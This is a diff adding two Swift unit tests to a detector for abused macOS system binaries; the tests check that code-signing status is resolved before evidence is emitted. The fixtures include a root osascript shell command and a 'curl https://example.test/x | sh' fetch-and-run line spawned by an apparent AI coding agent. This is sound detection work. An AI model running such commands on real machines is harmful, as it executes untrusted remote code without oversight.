@@ -66,6 +66,60 @@ final class LOLBinDetectorTests: XCTestCase {
         XCTAssertEqual(signal?.severity, .high)
     }
 
+    func test_evaluate_resolvesPendingSigningStatusBeforeEmittingEvidence() {
+        let proc = NickProcessInfo(
+            pid: 102,
+            path: "/usr/bin/osascript",
+            name: "osascript",
+            parentPID: 1,
+            parentName: "",
+            signingStatus: .pending,
+            metadata: ProcessMetadata(
+                user: "root",
+                startTime: Date(),
+                arguments: ["-e", "do shell script \"id\""]
+            )
+        )
+
+        let signal = LOLBinDetector.evaluate(
+            proc,
+            parentName: nil,
+            signingResolver: { _ in .signed(teamID: "APPLE_PLATFORM", signingID: "com.apple.osascript") }
+        )
+
+        XCTAssertEqual(
+            signal?.processInfo?.signingStatus,
+            .signed(teamID: "APPLE_PLATFORM", signingID: "com.apple.osascript")
+        )
+    }
+
+    func test_evaluate_resolvesUnknownPlatformSigningBeforeEmittingEvidence() {
+        let proc = NickProcessInfo(
+            pid: 103,
+            path: "/bin/zsh",
+            name: "zsh",
+            parentPID: 2,
+            parentName: "CodexCLI",
+            signingStatus: .unknown,
+            metadata: ProcessMetadata(
+                user: "tester",
+                startTime: Date(),
+                arguments: ["-c", "curl https://example.test/x | sh"]
+            )
+        )
+
+        let signal = LOLBinDetector.evaluate(
+            proc,
+            parentName: "CodexCLI",
+            signingResolver: { _ in .signed(teamID: "APPLE_PLATFORM", signingID: "com.apple.zsh") }
+        )
+
+        XCTAssertEqual(
+            signal?.processInfo?.signingStatus,
+            .signed(teamID: "APPLE_PLATFORM", signingID: "com.apple.zsh")
+        )
+    }
+
     // MARK: - xattr quarantine removal
 
     func test_evaluate_xattrRemovingQuarantine_returnsHighSignal() {
